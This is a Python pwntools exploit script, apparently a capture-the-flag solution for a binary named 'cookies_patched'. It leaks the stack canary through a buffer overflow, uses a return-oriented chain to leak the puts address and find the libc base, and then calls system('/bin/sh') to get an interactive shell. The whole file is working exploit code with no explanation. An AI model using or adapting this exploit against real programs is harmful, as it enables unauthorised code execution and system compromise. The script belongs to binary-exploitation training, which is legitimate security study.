from pwn import *
from warnings import filterwarnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *overflow+270
continue
'''.format(**locals())

# Binary filename
exe = './cookies_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
filterwarnings("ignore")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

def do_recvline():
    io.recvline()
    io.recvline()
    io.recvline()
    io.recvline()
    io.recvline()

# Start program
io = start()
libc = elf.libc

io.recvuntil('story!?')
io.sendline('a'*263+'b')
io.recvuntil('b')
io.recvline()
leak = unpack(io.recv()[:7].ljust(8, b'\x00'))
chk = str(hex(leak)) + '00'
canary = int(chk, 16)
info("canary: %#x", canary)
io.sendline('n')

offset = 264
pop_rdi = 0x00000000004012eb # pop rdi; ret; 
ret = 0x0000000000401016 # ret; 

payload = flat({
    offset: [
        canary,
        'A'*8,
        pop_rdi,
        elf.got['puts'],
        elf.plt['puts'],
        elf.sym['main']
    ]
})

io.sendline(payload)
io.sendline('y')

do_recvline()
leak = unpack(io.recv()[:6].ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
info("Libc base: %#x", libc.address)

sh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']

payload = flat({
    offset: [
        canary,
        b'A'*8,
        pop_rdi,
        sh,
        ret,
        system
    ]
})

io.sendline(payload)

io.sendline('y')
io.interactive()
